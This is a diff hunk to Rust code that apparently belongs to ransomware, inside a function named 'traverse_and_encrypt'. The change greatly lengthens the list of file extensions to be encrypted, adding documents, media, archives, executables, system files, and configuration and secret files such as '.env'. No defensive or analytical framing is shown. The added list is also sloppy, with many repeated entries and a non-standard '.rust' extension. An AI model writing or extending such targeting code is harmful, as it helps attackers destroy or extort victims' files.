@@ -26,7 +26,7 @@ pub fn traverse_and_encrypt() {
             ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
             ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
             ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
-            ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
+            ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf", ".docx", ".pdf", ".xlsx", ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".wav", ".m4a", ".mp4", ".avi", ".mov", ".zip", ".rar", ".7z", ".exe", ".app", ".py", ".cpp", ".java", ".db", ".sql", ".csv", ".ttf", ".otf", ".log", ".torrent", ".cfg", ".txt", ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".jsp", ".dll", ".bat", ".sh", ".svg", ".bmp", ".tif", ".tiff", ".doc", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".xls", ".bmp", ".psd", ".ai", ".eps", ".indd", ".dwg", ".max", ".blend", ".obj", ".fbx", ".3ds", ".stl", ".apk", ".iso", ".img", ".deb", ".rpm", ".bak", ".tmp", ".bak", ".tmp", ".csv", ".log", ".cfg", ".ini", ".yaml", ".yml", ".json", ".config", ".conf", ".properties", ".env", ".md", ".pdf", ".docx", ".xlsx", ".pptx", ".mp3", ".wav", ".ogg", ".aac", ".flac", ".wma", ".mp4", ".mov", ".avi", ".mkv", ".wmv", ".flv", ".webm", ".gif", ".jpg", ".jpeg", ".png", ".bmp", ".tiff", ".svg", ".psd", ".ai", ".eps", ".indd", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tar.gz", ".tar.bz2", ".tar.xz", ".exe", ".msi", ".dmg", ".app", ".bat", ".sh", ".jar", ".py", ".java", ".cpp", ".h", ".cs", ".rb", ".php", ".html", ".css", ".js", ".ts", ".swift", ".go", ".rust"
         ];
 
         // push all valid extension into VALID_EXTENSION_VEC
